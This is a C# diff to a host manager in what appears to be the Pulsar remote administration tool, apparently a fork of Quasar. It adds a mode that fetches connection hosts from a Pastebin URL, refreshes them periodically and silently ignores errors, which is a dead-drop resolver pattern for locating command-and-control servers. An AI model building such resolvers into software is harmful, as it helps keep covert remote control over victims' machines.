@@ -1,4 +1,5 @@
-﻿using System.Collections.Generic;
+﻿using System;
+using System.Collections.Generic;
 using System.Net;
 using System.Net.Sockets;
 
@@ -10,15 +11,62 @@ namespace Pulsar.Common.DNS
 
         private readonly Queue<Host> _hosts = new Queue<Host>();
         private Host _lastResolvedHost;
+        private readonly PastebinFetcher _pastebinFetcher;
+        private readonly HostsConverter _hostsConverter = new HostsConverter();
+        private readonly bool _isPastebinMode;
 
         public HostsManager(List<Host> hosts)
         {
             foreach (var host in hosts)
                 _hosts.Enqueue(host);
+            
+            _isPastebinMode = false;
+        }
+
+        public HostsManager(string pastebinUrl)
+        {
+            _isPastebinMode = true;
+            _pastebinFetcher = new PastebinFetcher(pastebinUrl);
+            
+            RefreshHostsFromPastebin();
+        }
+
+        private void RefreshHostsFromPastebin()
+        {
+            if (!_isPastebinMode || _pastebinFetcher == null)
+                return;
+
+            try
+            {
+                string content = _pastebinFetcher.FetchContent();
+                
+                if (string.IsNullOrWhiteSpace(content))
+                    return;
+
+                _hosts.Clear();
+
+                var hosts = _hostsConverter.RawHostsToList(content);
+                foreach (var host in hosts)
+                    _hosts.Enqueue(host);
+            }
+            catch (Exception)
+            {
+            }
         }
 
         public Host GetNextHost()
         {
+            if (_isPastebinMode)
+            {
+                if (_hosts.Count == 0 || _pastebinFetcher.ShouldRefresh)
+                {
+                    RefreshHostsFromPastebin();
+                }
+                
+                if (_hosts.Count == 0)
+                    return null;
+            }
+            
             var temp = _hosts.Dequeue();
             _hosts.Enqueue(temp); 
             temp.IpAddress = ResolveHostname(temp);
@@ -38,13 +86,11 @@ namespace Pulsar.Common.DNS
         {
             if (string.IsNullOrEmpty(host.Hostname)) return null;
 
-            IPAddress ip;
-            if (IPAddress.TryParse(host.Hostname, out ip))
+            if (IPAddress.TryParse(host.Hostname, out IPAddress ip))
             {
-                if (ip.AddressFamily == AddressFamily.InterNetworkV6)
-                {
-                    if (!Socket.OSSupportsIPv6) return null;
-                }
+                if (ip.AddressFamily == AddressFamily.InterNetworkV6 && !Socket.OSSupportsIPv6)
+                    return null;
+
                 return ip;
             }
 
@@ -58,21 +104,18 @@ namespace Pulsar.Common.DNS
                         case AddressFamily.InterNetwork:
                             return ipAddress;
                         case AddressFamily.InterNetworkV6:
-                            // Only use resolved IPv6 if no IPv4 address available,
-                            // otherwise it could be possible that the router the client
-                            // is using to connect to the internet doesn't support IPv6.
                             if (ipAddresses.Length == 1)
                                 return ipAddress;
                             break;
                     }
                 }
             }
-            catch (SocketException)
+            catch (Exception)
             {
                 return null;
             }
 
-            return null; 
+            return null;
         }
     }
 }
